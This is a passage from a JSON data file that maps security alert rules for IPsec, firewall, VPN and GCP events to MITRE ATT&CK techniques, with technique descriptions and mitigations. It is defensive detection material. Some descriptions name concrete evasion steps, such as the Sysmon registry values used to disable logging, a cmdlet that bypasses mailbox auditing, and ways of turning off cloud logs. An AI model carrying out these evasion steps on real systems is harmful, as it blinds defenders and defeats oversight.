            "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications."
        ],
        "mitigation_strategies": [
            "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces."
        ]
    },
    {
        "rule_id": 18662,
        "rule_description": "An IPsec negotiation with a remote computer failed because the IKE and AuthIP IPsec Keying Modules (IKEEXT) service is not started",
        "mitre_id": [
            "T1095",
            "T1489"
        ],
        "possible_attacks": [
            "Non-Application Layer Protocol",
            "Service Stop"
        ],
        "description": [
            "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
            "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible. In some cases, adversaries may stop or disable many or all services to render systems unusable. Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction]( or [Data Encrypted for Impact]( on the data stores of services like Exchange and SQL Server."
        ],
        "mitigation_strategies": [
            "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces.",
            "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations."
        ]
    },
    {
        "rule_id": 18664,
        "rule_description": "IPsec Services failed to initialize RPC server. IPsec Services could not be started",
        "mitre_id": [
            "T1489"
        ],
        "possible_attacks": [
            "Service Stop"
        ],
        "description": [
            "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible. In some cases, adversaries may stop or disable many or all services to render systems unusable. Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction]( or [Data Encrypted for Impact]( on the data stores of services like Exchange and SQL Server."
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations."
        ]
    },
    {
        "rule_id": 18665,
        "rule_description": "IPsec Services has experienced a critical failure and has been shut down",
        "mitre_id": [
            "T1529"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 18667,
        "rule_description": "IPsec Services was disabled",
        "mitre_id": [
            "T1489"
        ],
        "possible_attacks": [
            "Service Stop"
        ],
        "description": [
            "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible. In some cases, adversaries may stop or disable many or all services to render systems unusable. Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction]( or [Data Encrypted for Impact]( on the data stores of services like Exchange and SQL Server."
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations."
        ]
    },
    {
        "rule_id": 90501,
        "rule_description": "User initiated shutdown",
        "mitre_id": [
            "T1529"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 90509,
        "rule_description": "Active protection disabled",
        "mitre_id": [
            "T1562.001"
        ],
        "possible_attacks": [
            "Disable or Modify Tools"
        ],
        "description": [
            "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking]( adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation]( which may lead to bypassing anti-tampering features."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services."
        ]
    },
    {
        "rule_id": 90537,
        "rule_description": "An item has been deleted from quarantine",
        "mitre_id": [
            "T1070.004"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 64011,
        "rule_description": "ASA: ARP collision detected.",
        "mitre_id": [
            "T1095"
        ],
        "possible_attacks": [
            "Non-Application Layer Protocol"
        ],
        "description": [
            "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications."
        ],
        "mitigation_strategies": [
            "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces."
        ]
    },
    {
        "rule_id": 64020,
        "rule_description": "ASA: AAA (VPN) user locked out.",
        "mitre_id": [
            "T1133"
        ],
        "possible_attacks": [
            "External Remote Services"
        ],
        "description": [
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 64024,
        "rule_description": "ASA: Firewall configuration changed.",
        "mitre_id": [
            "T1562.004"
        ],
        "possible_attacks": [
            "Disable or Modify System Firewall"
        ],
        "description": [
            "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](\n\nAdversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds. Settings related to enabling abuse of various [Remote Services]( may also indirectly modify firewall rules."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or modifying firewall settings."
        ]
    },
    {
        "rule_id": 64027,
        "rule_description": "ASA: User created or modified on the Firewall.",
        "mitre_id": [
            "T1562.004"
        ],
        "possible_attacks": [
            "Disable or Modify System Firewall"
        ],
        "description": [
            "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](\n\nAdversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds. Settings related to enabling abuse of various [Remote Services]( may also indirectly modify firewall rules."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or modifying firewall settings."
        ]
    },
    {
        "rule_id": 64033,
        "rule_description": "ASA: Multiple AAA (VPN) authentication failures.",
        "mitre_id": [
            "T1110",
            "T1133"
        ],
        "possible_attacks": [
            "Brute Force",
            "External Remote Services"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access.",
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts.",
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 88203,
        "rule_description": "NextCloud brute force (multiple failed logins).",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 64223,
        "rule_description": "Reject: Prohibit a packet from passing. Send an ICMP destination-unreachable back to the source host.",
        "mitre_id": [
            "T1095"
        ],
        "possible_attacks": [
            "Non-Application Layer Protocol"
        ],
        "description": [
            "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications."
        ],
        "mitigation_strategies": [
            "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces."
        ]
    },
    {
        "rule_id": 64238,
        "rule_description": "Replace Malicious code: Malicious code in the connection was replaced.",
        "mitre_id": [
            "T1001"
        ],
        "possible_attacks": [
            "Data Obfuscation"
        ],
        "description": [
            "Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols. "
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate some obfuscation activity at the network level."
        ]
    },
    {
        "rule_id": 65051,
        "rule_description": "GCP pub/sub topic subscription created.",
        "mitre_id": [
            "T1530"
        ],
        "possible_attacks": [
            "Data from Cloud Storage"
        ],
        "description": [
            "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API]( In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories]( \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem. There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects."
        ],
        "mitigation_strategies": [
            "Configure user permissions groups and roles for access to cloud storage. Implement strict Identity and Access Management (IAM) controls to prevent access to storage solutions except for the applications, users, and services that require access. Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary."
        ]
    },
    {
        "rule_id": 65052,
        "rule_description": "GCP pub/sub topic created.",
        "mitre_id": [
            "T1530"
        ],
        "possible_attacks": [
            "Data from Cloud Storage"
        ],
        "description": [
            "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API]( In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories]( \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem. There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects."
        ],
        "mitigation_strategies": [
            "Configure user permissions groups and roles for access to cloud storage. Implement strict Identity and Access Management (IAM) controls to prevent access to storage solutions except for the applications, users, and services that require access. Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary."
        ]
    },
    {
        "rule_id": 65053,
        "rule_description": "GCP firewall rule created.",
        "mitre_id": [
            "T1562"
        ],
        "possible_attacks": [
            "Impair Defenses"
        ],
        "description": [
            "Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.\n\nAdversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.\n\n"
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security/logging services."
        ]
    },
    {
        "rule_id": 65054,
        "rule_description": "GCP firewall rule deleted.",
        "mitre_id": [
            "T1562.007"
        ],
        "possible_attacks": [
            "Disable or Modify Cloud Firewall"
        ],
        "description": [
            "Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in [Disable or Modify System Firewall]( \n\nCloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary with appropriate permissions may introduce new firewall rules or policies to allow access into a victim cloud environment and/or move laterally from the cloud control plane to the data plane. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups (or creates new security groups entirely) to allow any TCP/IP connectivity to a cloud-hosted instance. They may also remove networking limitations to support traffic associated with malicious activity (such as cryptomining).\n\nModifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. It may also be used to open up resources for [Brute Force]( or [Endpoint Denial of Service]( "
        ],
        "mitigation_strategies": [
            "Ensure least privilege principles are applied to Identity and Access Management (IAM) security policies."
        ]
    },
    {
        "rule_id": 65055,
        "rule_description": "GCP firewall rule modified.",
        "mitre_id": [
            "T1562.007"
        ],
        "possible_attacks": [
            "Disable or Modify Cloud Firewall"
        ],
        "description": [
            "Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in [Disable or Modify System Firewall]( \n\nCloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary with appropriate permissions may introduce new firewall rules or policies to allow access into a victim cloud environment and/or move laterally from the cloud control plane to the data plane. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups (or creates new security groups entirely) to allow any TCP/IP connectivity to a cloud-hosted instance. They may also remove networking limitations to support traffic associated with malicious activity (such as cryptomining).\n\nModifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. It may also be used to open up resources for [Brute Force]( or [Endpoint Denial of Service]( "
        ],
        "mitigation_strategies": [
            "Ensure least privilege principles are applied to Identity and Access Management (IAM) security policies."
        ]
    },
    {
        "rule_id": 65056,
        "rule_description": "GCP logging bucket deleted.",
        "mitre_id": [
            "T1562.008"
        ],
        "possible_attacks": [
            "Disable or Modify Cloud Logs"
        ],
        "description": [
            "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity. They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files. In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license."
        ],
        "mitigation_strategies": [
            "Configure default account policy to enable logging. Manage policies to ensure only necessary users have permissions to make changes to logging policies."
        ]
    },
    {
        "rule_id": 65057,
        "rule_description": "GCP logging sink deleted.",
        "mitre_id": [
            "T1562.008"
        ],
        "possible_attacks": [
            "Disable or Modify Cloud Logs"
        ],
        "description": [
            "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity. They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files. In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license."
        ],
        "mitigation_strategies": [
            "Configure default account policy to enable logging. Manage policies to ensure only necessary users have permissions to make changes to logging policies."
        ]
    },
    {
        "rule_id": 65058,
        "rule_description": "GCP pub/sub subscription deleted.",
        "mitre_id": [
            "T1562"
        ],
        "possible_attacks": [
            "Impair Defenses"
        ],
        "description": [
            "Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.\n\nAdversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.\n\n"
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security/logging services."
        ]
    },
    {
        "rule_id": 65059,
        "rule_description": "GCP pub/sub topic deleted.",
        "mitre_id": [
            "T1562"
        ],
        "possible_attacks": [
            "Impair Defenses"
        ],
        "description": [
            "Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.\n\nAdversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.\n\n"
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security/logging services."
        ]
    },
    {
        "rule_id": 65060,
        "rule_description": "GCP storage bucket configuration modified.",
        "mitre_id": [
            "T1222"
        ],
        "possible_attacks": [
            "File and Directory Permissions Modification"
        ],
        "description": [
            "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features]( [Boot or Logon Initialization Scripts]( [Unix Shell Configuration Modification]( or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths. "
        ],
        "mitigation_strategies": [
            "Applying more restrictive permissions to files and directories could prevent adversaries from modifying their access control lists. Additionally, ensure that user settings regarding local and remote symbolic links are properly set or disabled where unneeded."
        ]
    },
    {
        "rule_id": 65061,
        "rule_description": "GCP storage bucket permissions modified.",
        "mitre_id": [
            "T1222"
        ],
        "possible_attacks": [
            "File and Directory Permissions Modification"
        ],
        "description": [
            "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features]( [Boot or Logon Initialization Scripts]( [Unix Shell Configuration Modification]( or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths. "
        ],
        "mitigation_strategies": [
            "Applying more restrictive permissions to files and directories could prevent adversaries from modifying their access control lists. Additionally, ensure that user settings regarding local and remote symbolic links are properly set or disabled where unneeded."
        ]
    },
    {
        "rule_id": 65062,
        "rule_description": "GCP logging sink modified.",
        "mitre_id": [
            "T1537"
        ],
        "possible_attacks": [
            "Transfer Data to Cloud Account"
        ],
        "description": [
            "Adversaries may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service.\n\nA defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.\n\nAdversaries may also use cloud-native mechanisms to share victim data with adversary-controlled cloud accounts, such as creating anonymous file sharing links or, in Azure, a shared access signature (SAS) URI.\n\nIncidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts. "
        ],
        "mitigation_strategies": [
            "Limit user account and IAM policies to the least privileges required."
        ]
    },
    {
        "rule_id": 65063,
        "rule_description": "GCP IAM role deleted.",
        "mitre_id": [
            "T1531"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 65064,
        "rule_description": "GCP service account deleted.",
        "mitre_id": [
            "T1531"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 65065,
        "rule_description": "GCP service account disabled.",
        "mitre_id": [
            "T1531"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 65066,
        "rule_description": "GCP storage bucket deleted.",
        "mitre_id": [
            "T1485"
        ],
        "possible_attacks": [
            "Data Destruction"
        ],
        "description": [
            "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe]( and [Disk Structure Wipe]( because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable. In some cases politically oriented image files have been used to overwrite data.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts]( [OS Credential Dumping]( and [SMB/Windows Admin Shares](\n\nIn cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers."
        ],
        "mitigation_strategies": [
            "In cloud environments, limit permissions to modify cloud bucket lifecycle policies (e.g., `PutLifecycleConfiguration` in AWS) to only those accounts that require it. In AWS environments, consider using Service Control policies to limit the use of the `PutBucketLifecycle` API call. "
        ]
    },
    {
        "rule_id": 65070,
        "rule_description": "GCP new service account created.",
        "mitre_id": [
            "T1136.003"
        ],
        "possible_attacks": [
            "Cloud Account"
        ],
        "description": [
